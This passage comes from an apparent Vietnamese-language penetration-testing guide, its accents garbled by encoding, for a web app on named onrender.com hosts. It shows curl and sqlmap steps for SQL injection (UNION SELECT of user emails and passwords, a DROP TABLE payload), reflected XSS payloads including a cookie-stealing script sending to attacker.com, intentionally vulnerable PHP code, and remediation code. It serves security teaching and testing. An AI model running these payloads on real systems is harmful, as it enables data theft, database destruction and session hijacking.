# Th√™m d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ph√° v·ª° c√∫ ph√°p SQL
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1'" \
  -H "Accept: application/json"
```

**K·∫øt qu·∫£ mong ƒë·ª£i n·∫øu c√≥ l·ªó h·ªïng**:

```json
{
  "status": "error",
  "message": "SQL Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax...",
  "errors": {
    "trace": "..."
  }
}
```

**K·∫øt qu·∫£ mong ƒë·ª£i**:

N·∫øu endpoint c√≥ l·ªó h·ªïng SQL Injection, b·∫°n s·∫Ω th·∫•y l·ªói SQL syntax trong response. N·∫øu kh√¥ng c√≥ l·ªó h·ªïng, endpoint s·∫Ω tr·∫£ v·ªÅ 404 ho·∫∑c validation error.

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] C√≥ th√¥ng b√°o l·ªói SQL kh√¥ng? (C√≥/Kh√¥ng)
- [ ] N·ªôi dung l·ªói: `[Ghi ch√∫]`

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: Endpoint c√≥ l·ªói SQL syntax ‚Üí SQL Injection ƒë∆∞·ª£c x√°c nh·∫≠n
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Kh√¥ng c√≥ l·ªói SQL

#### **B∆∞·ªõc 4.3: X√°c nh·∫≠n SQL Injection v·ªõi payload ƒë√∫ng/sai**

```bash
# Payload ƒë√∫ng - trang s·∫Ω ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1%20AND%201=1" \
  -H "Accept: application/json"

# Payload sai - trang s·∫Ω thay ƒë·ªïi (kh√¥ng c√≥ d·ªØ li·ªáu)
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1%20AND%201=2" \
  -H "Accept: application/json"

# So s√°nh 2 response (l∆∞u v√†o file ƒë·ªÉ so s√°nh)
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1%20AND%201=1" \
  -H "Accept: application/json" > sql_true.json

curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1%20AND%201=2" \
  -H "Accept: application/json" > sql_false.json

# So s√°nh
echo "=== Response v·ªõi 1=1 ==="
cat sql_true.json | jq '.'
echo ""
echo "=== Response v·ªõi 1=2 ==="
cat sql_false.json | jq '.'
```

**Ghi ch√∫**:

- [ ] Response v·ªõi `1=1`: Status `_______`, C√≥ d·ªØ li·ªáu? (C√≥/Kh√¥ng)
- [ ] Response v·ªõi `1=2`: Status `_______`, C√≥ d·ªØ li·ªáu? (C√≥/Kh√¥ng)
- [ ] C√≥ s·ª± kh√°c bi·ªát kh√¥ng? (C√≥/Kh√¥ng)

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: C√≥ s·ª± kh√°c bi·ªát ‚Üí SQL Injection ƒë∆∞·ª£c x√°c nh·∫≠n
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Kh√¥ng c√≥ s·ª± kh√°c bi·ªát

#### **B∆∞·ªõc 4.4: Khai th√°c ƒë·ªÉ ƒë·ªçc d·ªØ li·ªáu (UNION SELECT)**

```bash
# Th·ª≠ ƒë·ªçc th√¥ng tin t·ª´ b·∫£ng users (gi·∫£ s·ª≠ c√≥ b·∫£ng users)
# L∆∞u √Ω: C·∫ßn ƒëi·ªÅu ch·ªânh s·ªë c·ªôt cho ph√π h·ª£p v·ªõi query g·ªëc
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1%20UNION%20SELECT%20id,email,password%20FROM%20users%20LIMIT%201--" \
  -H "Accept: application/json"

# Ho·∫∑c l∆∞u v√†o file ƒë·ªÉ xem
curl -k "https://backend-web-bds.onrender.com/api/properties/detail/1%20UNION%20SELECT%20id,email,password%20FROM%20users%20LIMIT%201--" \
  -H "Accept: application/json" > sql_union.json

# Xem k·∫øt qu·∫£
cat sql_union.json | jq '.'
```

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] C√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c d·ªØ li·ªáu t·ª´ b·∫£ng kh√°c kh√¥ng? (C√≥/Kh√¥ng)
- [ ] D·ªØ li·ªáu ƒë·ªçc ƒë∆∞·ª£c: `[Ghi ch√∫]`

#### **B∆∞·ªõc 4.5: S·ª≠ d·ª•ng SQLMap ƒë·ªÉ t·ª± ƒë·ªông khai th√°c**

```bash
# T·∫°o th∆∞ m·ª•c k·∫øt qu·∫£
mkdir -p ~/pentest_results/sqlmap
cd ~/pentest_results/sqlmap

# Ch·∫°y SQLMap tr√™n endpoint
sqlmap -u "https://backend-web-bds.onrender.com/api/properties/detail/1" \
  --batch \
  --dbs \
  --tables \
  --dump \
  --tamper=space2comment \
  --random-agent \
  --level=3 \
  --risk=2 \
  --output-dir=./sqlmap_results

# Xem k·∫øt qu·∫£
ls -la sqlmap_results/
```

**Ghi ch√∫**:

- [ ] SQLMap c√≥ ph√°t hi·ªán SQL Injection kh√¥ng? (C√≥/Kh√¥ng)
- [ ] S·ªë database t√¨m ƒë∆∞·ª£c: `_______`
- [ ] S·ªë b·∫£ng t√¨m ƒë∆∞·ª£c: `_______`
- [ ] D·ªØ li·ªáu c√≥ th·ªÉ dump ƒë∆∞·ª£c kh√¥ng? (C√≥/Kh√¥ng)

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: SQLMap x√°c nh·∫≠n SQL Injection
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: SQLMap kh√¥ng ph√°t hi·ªán

#### **B∆∞·ªõc 4.6: T·∫°o b√°o c√°o**

**Ghi ch√∫ v√†o b√°o c√°o**:

```
=== L·ªñ H·ªîNG 4: SQL INJECTION ===
Th·ªùi gian test: [Ghi ng√†y gi·ªù]
Tester: [T√™n c·ªßa b·∫°n]

K·∫øt qu·∫£: [‚ö†Ô∏è PH√ÅT HI·ªÜN / ‚ùå KH√îNG PH√ÅT HI·ªÜN]

Chi ti·∫øt:
- Endpoint: GET /api/properties/detail/{id} (c√≥ l·ªó h·ªïng SQL Injection - c√≥ th·ªÉ test)
- Payload 1 (1'): [K·∫øt qu·∫£ - c√≥ l·ªói SQL kh√¥ng?]
- Payload 2 (1 AND 1=1): [K·∫øt qu·∫£]
- Payload 3 (1 AND 1=2): [K·∫øt qu·∫£]
- UNION SELECT: [C√≥ th·ªÉ ƒë·ªçc d·ªØ li·ªáu kh√¥ng?]
- SQLMap: [K·∫øt qu·∫£ scan]
- **L∆∞u √Ω**: Route validation `whereNumber()` ƒë√£ ch·∫∑n payload ·ªü routing layer, nh∆∞ng code v·∫´n c√≥ l·ªó h·ªïng SQL Injection

M·ª©c ƒë·ªô nghi√™m tr·ªçng: R·∫§T CAO
Khuy·∫øn ngh·ªã: [Xem ph·∫ßn kh·∫Øc ph·ª•c b√™n d∆∞·ªõi]
```

**‚úÖ Ho√†n th√†nh L·ªó h·ªïng 4 khi**: ƒê√£ ho√†n th√†nh t·∫•t c·∫£ checklist tr√™n v√† ghi b√°o c√°o.

---

## üîç L·ªó h·ªïng 5: Reflected Cross-Site Scripting (XSS)

### üìå Th√¥ng tin l·ªó h·ªïng

- **M·ª©c ƒë·ªô nghi√™m tr·ªçng**: üî¥ **CAO**
- **Endpoint ch√≠nh**: `GET https://backend-web-bds.onrender.com/api/search/filter?search_keyword=<query>` (ƒë∆∞·ª£c s·ª≠ d·ª•ng trong giao di·ªán)
- **Endpoint ph·ª•**: `GET https://backend-web-bds.onrender.com/api/search/properties?q=<query>` (c√≥ s·∫µn)
- **Frontend**: `https://travel-taynd.onrender.com/search?search_keyword=<query>` ho·∫∑c `?q=<query>`
- **M√¥ t·∫£**:
  - Endpoint `/api/search/filter` ph·∫£n chi·∫øu tham s·ªë `search_keyword` ho·∫∑c `q` tr·ª±c ti·∫øp v√†o JSON response m√† kh√¥ng escape
  - Endpoint `/api/search/properties` c≈©ng c√≥ l·ªó h·ªïng t∆∞∆°ng t·ª± v·ªõi tham s·ªë `q`
  - Cho ph√©p ch√®n m√£ JavaScript ƒë·ªôc h·∫°i v√†o response, frontend render c√≥ th·ªÉ d·∫´n ƒë·∫øn XSS

### üîÑ Quy tr√¨nh ki·ªÉm th·ª≠ tu·∫ßn t·ª±

#### **B∆∞·ªõc 5.1: Test endpoint API c∆° b·∫£n**

‚ö†Ô∏è **L∆∞u √Ω**: Endpoint `/api/search/filter` l√† endpoint ƒë∆∞·ª£c s·ª≠ d·ª•ng trong giao di·ªán th·ª±c t·∫ø.

```bash
# Test endpoint ch√≠nh (ƒë∆∞·ª£c s·ª≠ d·ª•ng trong giao di·ªán)
curl -k -G "https://backend-web-bds.onrender.com/api/search/filter" \
  --data-urlencode "search_keyword=test" \
  --data-urlencode "bedrooms_min=2" \
  --data-urlencode "bedrooms_max=5" \
  --data-urlencode "page=1" \
  --data-urlencode "limit=10" \
  -H "Accept: application/json"

# Test endpoint ph·ª• (c√≥ s·∫µn)
curl -k -G "https://backend-web-bds.onrender.com/api/search/properties" \
  --data-urlencode "q=test" \
  -H "Accept: application/json"
```

**Ghi ch√∫**:

- [ ] Endpoint `/api/search/filter` ho·∫°t ƒë·ªông? (C√≥/Kh√¥ng)
- [ ] Endpoint `/api/search/properties` ho·∫°t ƒë·ªông? (C√≥/Kh√¥ng)
- [ ] Keyword c√≥ xu·∫•t hi·ªán trong response kh√¥ng? (C√≥/Kh√¥ng)
- [ ] Keyword c√≥ ƒë∆∞·ª£c escape kh√¥ng? (C√≥/Kh√¥ng)
- [ ] Status Code: `_______`

**Checklist**:

- [ ] C·∫£ 2 endpoint ƒë·ªÅu ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng

#### **B∆∞·ªõc 5.2: Test payload XSS c∆° b·∫£n tr√™n API**

```bash
# Payload XSS ƒë∆°n gi·∫£n - Test endpoint ch√≠nh
curl -k -G "https://backend-web-bds.onrender.com/api/search/filter" \
  --data-urlencode "search_keyword=<script>alert('XSS')</script>" \
  --data-urlencode "page=1" \
  --data-urlencode "limit=10" \
  -H "Accept: application/json" > xss_payload_api.json

# Payload XSS ƒë∆°n gi·∫£n - Test endpoint ph·ª•
curl -k -G "https://backend-web-bds.onrender.com/api/search/properties" \
  --data-urlencode "q=<script>alert('XSS')</script>" \
  -H "Accept: application/json" > xss_payload_api2.json

# Ki·ªÉm tra payload c√≥ xu·∫•t hi·ªán nguy√™n v·∫πn kh√¥ng
echo "=== Endpoint ch√≠nh (filter) ==="
cat xss_payload_api.json | grep -i "script"
echo ""
echo "=== Endpoint ph·ª• (properties) ==="
cat xss_payload_api2.json | grep -i "script"
```

**K·∫øt qu·∫£ mong ƒë·ª£i n·∫øu c√≥ l·ªó h·ªïng**:

- Payload `<script>alert('XSS')</script>` xu·∫•t hi·ªán nguy√™n v·∫πn trong response
- Kh√¥ng b·ªã escape th√†nh `&lt;script&gt;...`

**Ghi ch√∫**:

- [ ] Status Code: `_______`
- [ ] Payload c√≥ xu·∫•t hi·ªán trong response kh√¥ng? (C√≥/Kh√¥ng)
- [ ] Payload c√≥ b·ªã escape kh√¥ng? (C√≥/Kh√¥ng)

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: Payload xu·∫•t hi·ªán nguy√™n v·∫πn ‚Üí XSS c√≥ th·ªÉ t·ªìn t·∫°i
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Payload b·ªã escape ho·∫∑c kh√¥ng xu·∫•t hi·ªán

#### **B∆∞·ªõc 5.3: Test c√°c payload XSS kh√°c**

```bash
# Payload v·ªõi event handler - Test endpoint ch√≠nh
curl -k -G "https://backend-web-bds.onrender.com/api/search/filter" \
  --data-urlencode "search_keyword=<img src=x onerror=alert('XSS')>" \
  --data-urlencode "page=1" \
  --data-urlencode "limit=10" \
  -H "Accept: application/json" > xss_img.json

# Payload v·ªõi SVG - Test endpoint ch√≠nh
curl -k -G "https://backend-web-bds.onrender.com/api/search/filter" \
  --data-urlencode "search_keyword=<svg onload=alert('XSS')>" \
  --data-urlencode "page=1" \
  --data-urlencode "limit=10" \
  -H "Accept: application/json" > xss_svg.json

# Ki·ªÉm tra c√°c payload
echo "=== IMG payload ==="
cat xss_img.json | grep -i "img\|onerror"
echo ""
echo "=== SVG payload ==="
cat xss_svg.json | grep -i "svg\|onload"
```

**Ghi ch√∫**:

- [ ] Payload IMG: C√≥ xu·∫•t hi·ªán? (C√≥/Kh√¥ng)
- [ ] Payload SVG: C√≥ xu·∫•t hi·ªán? (C√≥/Kh√¥ng)

#### **B∆∞·ªõc 5.4: Test tr√™n Frontend (Quan tr·ªçng)**

**M·ªü tr√¨nh duy·ªát v√† th·ª±c hi·ªán**:

1. Truy c·∫≠p URL v·ªõi payload XSS:

**Endpoint ch√≠nh (filter)**:

```
https://backend-web-bds.onrender.com/api/search/filter?search_keyword=%3Csvg%20onload%3Dalert(%27XSS%27)%3E&page=1&limit=10
```

**Endpoint ph·ª• (properties)**:

```
https://backend-web-bds.onrender.com/api/search/properties?q=%3Csvg%20onload%3Dalert(%27XSS%27)%3E
```

2. M·ªü Developer Tools (F12) ‚Üí Tab Console

3. Ki·ªÉm tra:
   - [ ] C√≥ h·ªôp tho·∫°i alert xu·∫•t hi·ªán kh√¥ng? (C√≥/Kh√¥ng)
   - [ ] C√≥ l·ªói JavaScript trong console kh√¥ng? (C√≥/Kh√¥ng)

4. Ki·ªÉm tra m√£ ngu·ªìn HTML:
   - [ ] M·ªü View Source ho·∫∑c Inspect Element
   - [ ] T√¨m payload trong HTML
   - [ ] Payload c√≥ b·ªã escape kh√¥ng? (C√≥/Kh√¥ng)

**Ghi ch√∫**:

- [ ] Alert c√≥ xu·∫•t hi·ªán? (C√≥/Kh√¥ng)
- [ ] Payload trong HTML: `[Ghi ch√∫]`

**Checklist**:

- [ ] ‚ö†Ô∏è **PH√ÅT HI·ªÜN**: Alert xu·∫•t hi·ªán ‚Üí XSS ƒë∆∞·ª£c x√°c nh·∫≠n
- [ ] ‚ùå **KH√îNG PH√ÅT HI·ªÜN**: Alert kh√¥ng xu·∫•t hi·ªán

#### **B∆∞·ªõc 5.5: S·ª≠ d·ª•ng XSStrike ƒë·ªÉ t·ª± ƒë·ªông scan**

```bash
# T·∫°o th∆∞ m·ª•c k·∫øt qu·∫£
mkdir -p ~/pentest_results/xsstrike
cd ~/pentest_results/xsstrike

# Ch·∫°y XSStrike tr√™n endpoint ch√≠nh
cd ~/XSStrike
python3 xsstrike.py -u "https://backend-web-bds.onrender.com/api/search/filter?search_keyword=test&page=1&limit=10" \
  --crawl \
  --headers "Accept: application/json" \
  -o ~/pentest_results/xsstrike/xss_results.txt

# Ho·∫∑c test endpoint ph·ª•
python3 xsstrike.py -u "https://backend-web-bds.onrender.com/api/search/properties?q=test" \
  --crawl \
  --headers "Accept: application/json" \
  -o ~/pentest_results/xsstrike/xss_results2.txt

# Xem k·∫øt qu·∫£
cat ~/pentest_results/xsstrike/xss_results.txt
```

**Ghi ch√∫**:

- [ ] XSStrike c√≥ ph√°t hi·ªán XSS kh√¥ng? (C√≥/Kh√¥ng)
- [ ] S·ªë payload th√†nh c√¥ng: `_______`

#### **B∆∞·ªõc 5.6: Test payload ƒë√°nh c·∫Øp cookie (Demo)**

```bash
# Payload ƒë√°nh c·∫Øp cookie (ch·ªâ demo, kh√¥ng g·ª≠i th·ª±c t·∫ø)
# L∆∞u √Ω: Thay attacker.com b·∫±ng server c·ªßa b·∫°n n·∫øu mu·ªën test th·ª±c t·∫ø

# Test tr√™n endpoint ch√≠nh
curl -k -G "https://backend-web-bds.onrender.com/api/search/filter" \
  --data-urlencode "search_keyword=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" \
  --data-urlencode "page=1" \
  --data-urlencode "limit=10" \
  -H "Accept: application/json" > xss_cookie_steal.json

# Ho·∫∑c test tr√™n endpoint ph·ª•
curl -k -G "https://backend-web-bds.onrender.com/api/search/properties" \
  --data-urlencode "q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" \
  -H "Accept: application/json" > xss_cookie_steal2.json

# Ch·ªâ ki·ªÉm tra payload c√≥ trong response
cat xss_cookie_steal.json | grep -i "script\|document.location"
```

**‚ö†Ô∏è L∆∞u √Ω**: Ch·ªâ test payload n√†y trong m√¥i tr∆∞·ªùng test, kh√¥ng s·ª≠ d·ª•ng tr√™n h·ªá th·ªëng th·ª±c.

#### **B∆∞·ªõc 5.7: T·∫°o b√°o c√°o**

**Ghi ch√∫ v√†o b√°o c√°o**:

```
=== L·ªñ H·ªîNG 5: REFLECTED XSS ===
Th·ªùi gian test: [Ghi ng√†y gi·ªù]
Tester: [T√™n c·ªßa b·∫°n]

K·∫øt qu·∫£: [‚ö†Ô∏è PH√ÅT HI·ªÜN / ‚ùå KH√îNG PH√ÅT HI·ªÜN]

Chi ti·∫øt:
- Endpoint API ch√≠nh: GET /api/search/filter?search_keyword=... (ƒë∆∞·ª£c s·ª≠ d·ª•ng trong giao di·ªán)
- Endpoint API ph·ª•: GET /api/search/properties?q=... (c√≥ s·∫µn)
- Frontend: https://travel-taynd.onrender.com/search?search_keyword=... ho·∫∑c ?q=...
- Payload 1 (<script>alert('XSS')</script>): [K·∫øt qu·∫£]
- Payload 2 (<img onerror=...>): [K·∫øt qu·∫£]
- Payload 3 (<svg onload=...>): [K·∫øt qu·∫£]
- Test tr√™n Frontend: [Alert c√≥ xu·∫•t hi·ªán?]
- XSStrike: [K·∫øt qu·∫£ scan]

M·ª©c ƒë·ªô nghi√™m tr·ªçng: CAO
Khuy·∫øn ngh·ªã: [Xem ph·∫ßn kh·∫Øc ph·ª•c b√™n d∆∞·ªõi]
```

**‚úÖ Ho√†n th√†nh L·ªó h·ªïng 5 khi**: ƒê√£ ho√†n th√†nh t·∫•t c·∫£ checklist tr√™n v√† ghi b√°o c√°o.

---

## üìù T·ªïng h·ª£p b√°o c√°o cu·ªëi c√πng

### Checklist t·ªïng h·ª£p

- [ ] ‚úÖ L·ªó h·ªïng 1: User Enumeration - ƒê√£ ho√†n th√†nh
- [ ] ‚úÖ L·ªó h·ªïng 2: Path Traversal - ƒê√£ ho√†n th√†nh
- [ ] ‚úÖ L·ªó h·ªïng 3: Directory Enumeration - ƒê√£ ho√†n th√†nh
- [ ] ‚úÖ L·ªó h·ªïng 4: SQL Injection - ƒê√£ ho√†n th√†nh
- [ ] ‚úÖ L·ªó h·ªïng 5: Reflected XSS - ƒê√£ ho√†n th√†nh

### B·∫£ng t·ªïng h·ª£p k·∫øt qu·∫£

| STT | L·ªó H·ªïng               | K·∫øt Qu·∫£ | M·ª©c ƒê·ªô            | Ghi Ch√∫            |
| --- | --------------------- | ------- | ----------------- | ------------------ |
| 1   | User Enumeration      | [‚ö†Ô∏è/‚ùå] | üî¥ CAO            | [Ghi ch√∫ ng·∫Øn g·ªçn] |
| 2   | Path Traversal        | [‚ö†Ô∏è/‚ùå] | üî¥ R·∫§T CAO        | [Ghi ch√∫ ng·∫Øn g·ªçn] |
| 3   | Directory Enumeration | [‚ö†Ô∏è/‚ùå] | üü° TRUNG B√åNH-CAO | [Ghi ch√∫ ng·∫Øn g·ªçn] |
| 4   | SQL Injection         | [‚ö†Ô∏è/‚ùå] | üî¥ R·∫§T CAO        | [Ghi ch√∫ ng·∫Øn g·ªçn] |
| 5   | Reflected XSS         | [‚ö†Ô∏è/‚ùå] | üî¥ CAO            | [Ghi ch√∫ ng·∫Øn g·ªçn] |

### T√≥m t·∫Øt

**T·ªïng s·ªë l·ªó h·ªïng ph√°t hi·ªán**: `_______ / 5`

**L·ªó h·ªïng nghi√™m tr·ªçng nh·∫•t**: `[Ghi t√™n l·ªó h·ªïng]`

**Khuy·∫øn ngh·ªã ∆∞u ti√™n kh·∫Øc ph·ª•c**:

1. `[L·ªó h·ªïng ∆∞u ti√™n 1]`
2. `[L·ªó h·ªïng ∆∞u ti√™n 2]`
3. `[L·ªó h·ªïng ∆∞u ti√™n 3]`

---

## üî¨ Ph√¢n t√≠ch chi ti·∫øt l·ªó h·ªïng 4 v√† 5

### üìä L·ªó h·ªïng 4: SQL Injection - Ph√¢n t√≠ch chi ti·∫øt

#### **Nguy√™n nh√¢n g·ªëc r·ªÖ**

**File**: `app/Repositories/PropertyRepository/PropertyRepository.php` (D√≤ng 57)

```php
// ‚ö†Ô∏è CODE KH√îNG AN TO√ÄN
$query = "SELECT * FROM properties WHERE id = " . $id . " AND deleted_at IS NULL";
$property = \Illuminate\Support\Facades\DB::select($query);
```

**V·∫•n ƒë·ªÅ**:

1. **String Concatenation**: ID ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o SQL query
2. **Kh√¥ng Parameterized**: Kh√¥ng s·ª≠ d·ª•ng prepared statements
3. **Kh√¥ng Validation**: Kh√¥ng ki·ªÉm tra input tr∆∞·ªõc khi truy·ªÅn v√†o query
4. **Expose Error**: L·ªói SQL ƒë∆∞·ª£c hi·ªÉn th·ªã chi ti·∫øt, ti·∫øt l·ªô c·∫•u tr√∫c database

#### **C√°ch khai th√°c**

**Payload c∆° b·∫£n**:

```bash
# Ph√° v·ª° c√∫ ph√°p SQL
/api/properties/detail/1'

# Bypass authentication
/api/properties/detail/1' OR '1'='1

# ƒê·ªçc d·ªØ li·ªáu t·ª´ b·∫£ng kh√°c
/api/properties/detail/1' UNION SELECT id,email,password FROM users--

# X√≥a d·ªØ li·ªáu
/api/properties/detail/1'; DROP TABLE properties--
```

#### **T√°c ƒë·ªông**

| T√°c ƒë·ªông                  | M√¥ t·∫£                                           | M·ª©c ƒë·ªô     |
| ------------------------- | ----------------------------------------------- | ---------- |
| **ƒê·ªçc d·ªØ li·ªáu**           | ƒê·ªçc to√†n b·ªô database (users, passwords, tokens) | üî¥ R·∫§T CAO |
| **S·ª≠a d·ªØ li·ªáu**           | Thay ƒë·ªïi, x√≥a d·ªØ li·ªáu                           | üî¥ R·∫§T CAO |
| **Bypass Authentication** | ƒêƒÉng nh·∫≠p kh√¥ng c·∫ßn password                    | üî¥ R·∫§T CAO |
| **Th·ª±c thi l·ªánh**         | Ch·∫°y l·ªánh SQL t√πy √Ω                             | üî¥ R·∫§T CAO |
| **L·ªô th√¥ng tin**          | Stack trace ti·∫øt l·ªô c·∫•u tr√∫c h·ªá th·ªëng           | üü° CAO     |

---

### üìä L·ªó h·ªïng 5: Reflected XSS - Ph√¢n t√≠ch chi ti·∫øt

#### **Nguy√™n nh√¢n g·ªëc r·ªÖ**

**File**: `app/Http/Controllers/Search/SearchController.php` (D√≤ng 25-40)

```php
// ‚ö†Ô∏è CODE KH√îNG AN TO√ÄN
$keyword = $request->input('q', '');

// L·ªó h·ªïng: Kh√¥ng escape output
$data->getCollection()->transform(function ($item) use ($keyword) {
    $item->search_keyword = $keyword; // ‚ö†Ô∏è Kh√¥ng escape - d·ªÖ b·ªã XSS
    return $item;
});

$message = "K·∫øt qu·∫£ t√¨m ki·∫øm cho: " . $keyword; // ‚ö†Ô∏è Kh√¥ng escape
```

**V·∫•n ƒë·ªÅ**:

1. **Kh√¥ng Escape Output**: Keyword ƒë∆∞·ª£c tr·∫£ v·ªÅ tr·ª±c ti·∫øp trong response
2. **Frontend Render**: Frontend c√≥ th·ªÉ render tr·ª±c ti·∫øp d·∫´n ƒë·∫øn XSS
3. **Kh√¥ng Sanitize**: Kh√¥ng lo·∫°i b·ªè HTML/JavaScript tags
4. **Multiple Vectors**: C√≥ th·ªÉ t·∫•n c√¥ng qua API response ho·∫∑c Frontend rendering

#### **C√°ch khai th√°c**

**Payload c∆° b·∫£n**:

**Endpoint ch√≠nh (`/api/search/filter`)**:

```bash
# Payload 1: Script tag
/api/search/filter?search_keyword=<script>alert('XSS')</script>&page=1&limit=10

# Payload 2: Event handler
/api/search/filter?search_keyword=<img src=x onerror=alert('XSS')>&page=1&limit=10

# Payload 3: SVG
/api/search/filter?search_keyword=<svg onload=alert('XSS')>&page=1&limit=10

# Payload 4: ƒê√°nh c·∫Øp cookie
/api/search/filter?search_keyword=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>&page=1&limit=10
```

**Endpoint ph·ª• (`/api/search/properties`)**:

```bash
# Payload 1: Script tag
/api/search/properties?q=<script>alert('XSS')</script>

# Payload 2: Event handler
/api/search/properties?q=<img src=x onerror=alert('XSS')>

# Payload 3: SVG
/api/search/properties?q=<svg onload=alert('XSS')>
```

**Frontend URL**:

```
# Endpoint ch√≠nh
https://travel-taynd.onrender.com/search?search_keyword=<script>alert('XSS')</script>

# Endpoint ph·ª•
https://travel-taynd.onrender.com/search?q=<script>alert('XSS')</script>
```

#### **T√°c ƒë·ªông**

| T√°c ƒë·ªông            | M√¥ t·∫£                                    | M·ª©c ƒë·ªô        |
| ------------------- | ---------------------------------------- | ------------- |
| **ƒê√°nh c·∫Øp Cookie** | L·∫•y session token, authentication cookie | üî¥ CAO        |
| **Phishing**        | Redirect user ƒë·∫øn trang gi·∫£ m·∫°o          | üî¥ CAO        |
| **Keylogging**      | Ghi l·∫°i thao t√°c b√†n ph√≠m                | üî¥ CAO        |
| **Defacement**      | Thay ƒë·ªïi n·ªôi dung trang web              | üü° TRUNG B√åNH |
| **Th·ª±c thi m√£ ƒë·ªôc** | Ch·∫°y JavaScript t√πy √Ω tr√™n tr√¨nh duy·ªát   | üî¥ CAO        |

---

## üõ°Ô∏è C√°ch kh·∫Øc ph·ª•c c√°c l·ªó h·ªïng

### 1. Kh·∫Øc ph·ª•c User Enumeration

**File**: `backend_dev/app/Http/Controllers/Auth/AuthController.php`

**Code an to√†n**:

```php
public function forgotPassword(Request $request)
{
    // Lu√¥n tr·∫£ v·ªÅ th√¥ng b√°o gi·ªëng nhau
    $response = $this->authService->forgotPassword($request);

    // Lu√¥n tr·∫£ v·ªÅ success message gi·ªëng nhau
    return ApiResponse::success(
        null,
        'N·∫øu email t·ªìn t·∫°i trong h·ªá th·ªëng, ƒë∆∞·ªùng link ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn email c·ªßa b·∫°n.'
    );
}
```

### 2. Kh·∫Øc ph·ª•c Path Traversal

**File**: `backend_dev/app/Http/Controllers/File/FileController.php`

**Code an to√†n**:

```php
public function download(Request $request)
{
    $filePath = $request->input('file');

    if (!$filePath) {
        return ApiResponse::error('Tham s·ªë file l√† b·∫Øt bu·ªôc', null, 400);
    }

    // 1. S·ª≠ d·ª•ng basename() ƒë·ªÉ lo·∫°i b·ªè path traversal
    $fileName = basename($filePath);

    // 2. Validate extension (whitelist)
    $allowedExtensions = ['pdf', 'jpg', 'png', 'doc', 'docx'];
    $extension = pathinfo($fileName, PATHINFO_EXTENSION);

    if (!in_array(strtolower($extension), $allowedExtensions)) {
        return ApiResponse::error('Lo·∫°i file kh√¥ng ƒë∆∞·ª£c ph√©p', null, 400);
    }

    // 3. X√°c ƒë·ªãnh ƒë∆∞·ªùng d·∫´n an to√†n
    $safePath = storage_path('app/public/' . $fileName);

    // 4. Ki·ªÉm tra file c√≥ n·∫±m trong th∆∞ m·ª•c cho ph√©p kh√¥ng
    $realPath = realpath($safePath);
    $allowedDir = realpath(storage_path('app/public'));

    if (!$realPath || strpos($realPath, $allowedDir) !== 0) {
        return ApiResponse::error('File kh√¥ng h·ª£p l·ªá', null, 403);
    }

    if (!file_exists($realPath)) {
        return ApiResponse::error('File kh√¥ng t·ªìn t·∫°i', null, 404);
    }

    return response()->download($realPath);
}
```

### 3. Kh·∫Øc ph·ª•c Directory Enumeration

**File**: `backend_dev/docker/nginx.conf`

**Code an to√†n**:

```nginx
location /storage {
    autoindex off;  # T·∫Øt directory listing
    deny all;       # T·ª´ ch·ªëi truy c·∫≠p tr·ª±c ti·∫øp
}

location /public {
    autoindex off;  # T·∫Øt directory listing
}
```

### 4. Kh·∫Øc ph·ª•c SQL Injection

**File**: `backend_dev/app/Repositories/PropertyRepository/PropertyRepository.php`

#### **Gi·∫£i ph√°p 1: S·ª≠ d·ª•ng Eloquent ORM (Khuy·∫øn ngh·ªã nh·∫•t)**

```php
public function find($id)
{
    // ‚úÖ AN TO√ÄN: Eloquent t·ª± ƒë·ªông s·ª≠ d·ª•ng prepared statements
    // ‚úÖ AN TO√ÄN: T·ª± ƒë·ªông escape v√† validate
    // ‚úÖ AN TO√ÄN: Kh√¥ng th·ªÉ SQL Injection
    return $this->model::with(['location', 'contact', 'features'])
        ->where('id', $id)
        ->whereNull('deleted_at')
        ->firstOrFail();
}
```

#### **Gi·∫£i ph√°p 2: S·ª≠ d·ª•ng Query Builder v·ªõi Parameter Binding**

```php
public function find($id)
{
    // ‚úÖ AN TO√ÄN: S·ª≠ d·ª•ng parameter binding
    $property = DB::table('properties')
        ->where('id', $id)  // Laravel t·ª± ƒë·ªông bind parameter
        ->whereNull('deleted_at')
        ->first();

    if (!$property) {
        throw new ModelNotFoundException();
    }

    return $this->model::find($id)->load(['location', 'contact', 'features']);
}
```

#### **Gi·∫£i ph√°p 3: Raw Query v·ªõi Parameter Binding (N·∫øu c·∫ßn raw SQL)**

```php
public function find($id)
{
    // ‚úÖ AN TO√ÄN: S·ª≠ d·ª•ng ? placeholder v√† bind parameter
    $property = DB::select(
        "SELECT * FROM properties WHERE id = ? AND deleted_at IS NULL",
        [$id]  // Parameter ƒë∆∞·ª£c bind an to√†n
    );

    if (empty($property)) {
        throw new ModelNotFoundException();
    }

    return $this->model::find($id)->load(['location', 'contact', 'features']);
}
```

#### **Gi·∫£i ph√°p 4: Validate Input tr∆∞·ªõc khi query**

```php
public function find($id)
{
    // ‚úÖ Validate input
